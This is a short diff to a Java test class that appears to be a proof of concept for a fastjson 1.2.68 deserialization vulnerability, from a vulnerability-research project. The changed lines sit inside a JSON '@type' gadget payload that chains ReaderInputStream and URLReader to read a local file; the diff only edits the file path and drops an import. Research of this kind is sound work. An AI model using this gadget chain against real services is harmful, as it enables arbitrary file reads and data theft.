@@ -1,5 +1,4 @@
 import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.ParserConfig;
 import org.junit.Test;
 
 public class fastjson_1_2_68_jdk11 {
@@ -70,7 +69,7 @@ public class fastjson_1_2_68_jdk11 {
                 "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                 "            \"reader\": {\n" +
                 "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
-                "                \"url\": \"file:///Users/ppp/Desktop/a\"\n" +
+                "                \"url\": \"file:///Users/ppp/Documents/dev/PPPVULNS/fastjsonDemo/fastjson_1_2_68_jdk11/a\"\n" +
                 "            },\n" +
                 "            \"charsetName\": \"UTF-8\",\n" +
                 "            \"bufferSize\": 1024\n" +
